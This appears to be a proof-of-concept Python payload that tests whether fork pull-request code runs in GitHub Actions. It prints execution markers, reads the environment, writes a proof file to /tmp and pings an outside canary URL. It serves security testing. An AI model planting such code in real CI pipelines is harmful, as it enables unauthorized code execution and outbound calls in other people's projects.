print("hb-fork-exec: Malicious Python file executed!")
import os
print(f"Current directory: {os.getcwd()}")
print(f"Environment: {os.environ.get('GITHUB_ACTIONS', 'Not in GitHub Actions')}")

# Simple proof of execution
with open("/tmp/hb-fork-exec-proof.txt", "w") as f:
    f.write("hb-fork-exec: Code execution achieved!")

# Also try to make an HTTP call as backup verification
try:
    import urllib.request
    urllib.request.urlopen("http://canary.domain/hb-fork-exec", timeout=1)
except Exception as e:
    print(f"HTTP call failed: {e}")